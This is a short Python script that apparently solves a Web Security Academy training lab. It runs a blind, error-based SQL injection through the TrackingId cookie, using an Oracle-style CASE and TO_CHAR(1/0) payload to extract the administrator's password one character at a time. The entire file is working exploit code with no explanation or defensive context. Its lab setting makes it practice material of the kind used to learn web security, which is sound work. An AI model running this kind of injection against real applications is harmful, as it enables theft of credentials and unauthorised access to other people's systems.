import requests

url = "https://0af7000d044c842b8093f871007300b2.web-security-academy.net/"

password = ''
vals = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`', '{', '|', '}', ' ']
counter = 1
while(True):
	print(f"Looking for char #{counter}")
	for i in vals:
		session = requests.Session()
		tracking_cookie = f"abc' OR (SELECT CASE WHEN (SUBSTR((select password from users where username='administrator'), {counter}, 1) ='{i}') THEN TO_CHAR(1/0) ELSE 'a' END  from dual)='a"
		#print(tracking_cookie)
		response = session.get(
			url,
			cookies={'TrackingId':tracking_cookie})
		if("Error" in response.text):
			password += i
			counter += 1
			break
	print(password)
